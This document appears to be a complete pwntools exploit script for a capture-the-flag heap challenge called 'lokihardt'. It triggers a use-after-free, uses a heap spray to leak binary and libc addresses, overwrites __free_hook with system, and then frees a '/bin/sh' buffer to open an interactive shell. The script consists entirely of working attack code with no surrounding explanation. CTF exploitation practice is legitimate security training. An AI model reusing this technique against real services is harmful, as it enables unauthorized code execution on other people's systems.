#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *
import sys

binary = './lokihardt'
elf = ELF(binary)
libc = elf.libc

context.log_level = 'error'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

def Alloc(idx, cont, buf):
    menu(1)
    io.recvuntil("idx? ")
    io.sendline(str(idx))
    io.send(cont)
    io.send(buf)

def Delete(idx):
    menu(2)
    io.recvuntil("idx? ")
    io.sendline(str(idx))

def Use(idx, typ = None, dat = None):
    menu(3)
    io.recvuntil("idx? ")
    io.sendline(str(idx))
    if typ == 'read':
        res = io.recvline()
        if res == '- menu -\n':
            raise Exception('no')
        else:
            return res
    if typ == 'write':
        res = io.recvn(10)
        if res == 'your data?':
            io.send(dat)
        else:
            raise Exception('no')


def gc():
    menu(4)

def AllocObj(cont, buf):
    menu(5)
    io.send(cont)
    io.send(buf)


def exit(signum, frame):
    sys.exit(1337)

signal.signal(signal.SIGINT, exit)
signal.signal(signal.SIGTERM, exit)

while True:
    try:
        io = process(binary, aslr = 0)
        Alloc(0, 'A' * 0x100, 'a' * 0x10)
        Delete(10)
        gc()

        pad = 'read\0read\0read\0'.ljust(0x10, '\0')
        AllocObj('d' * 0x100, pad)
        AllocObj('d' * 0x100, pad)
        res = Use(0, 'read')
        # now we get the binary address
        bin_addr = myu64(res[:8]) - 0x1258
        print(hex(bin_addr))

        # heap spray again to leak the libc
        arraybuffer = bin_addr + 0x202080
        write_ptr_addr = bin_addr + 0x12bd
        stdout_got_addr = bin_addr + 0x201f40

        # arraybuffer[2] ===> stdout ====> libc_addr
        # arraybuffer[2] + 0x110 === p->type === theOBJ_addr ====> "read"
        # 0x20140 + 0x110 = theOBJ_addr
        # bypass the check of strcmp(p->type, "read");
        # if(!strcmp(p->type, "write")){
        #     printf("your data?");
        #     fread(p->wdata, 1, p->length, stdin);
        # }


        Alloc(1, 'a' * 0x100, 'a' * 0x10)
        Delete(10)
        gc()
        pad = 'write\0write\0'.ljust(0x10, '\0')
        pay = p64(arraybuffer + 0x10) + p64(8) + p64(write_ptr_addr) + p64(0)
        AllocObj(pay * 8, pad)
        AllocObj(pay * 8, pad)
        Use(1, 'write', p64(stdout_got_addr))

        Alloc(3, 'read\0' * 51 + '\0', 'a' * 0x10)
        res = Use(2, 'read')
        libc_addr = myu64(res[:8]) - 0x3c5708
	print(hex(libc_addr))
        Delete(3)
        gc()

        # now overwrite the free_hook
        # arraybuffer[2] + 0x100 === p->wdata === g_buf_addr
     	# if(!strcmp(p->type, "write")){
     	#     printf("your data?");
     	#     fread(p->wdata, 1, p->length, stdin);
     	# }

        free_hook = libc_addr + libc.symbols['__free_hook']
        system_addr = libc_addr + libc.symbols['system']
        Alloc(3, 'write\0'.ljust(0x100, '\0'), p64(free_hook) + p64(8))
        Use(2, 'write', p64(system_addr))
        Delete(3)
        gc()

        # trigger system
        Alloc(3, '/bin/sh\0'.ljust(0x100, '\0'), 'a' * 0x10)
        Delete(3)
        gc()
        io.interactive()
    except Exception as e:
        io.close()
        pass

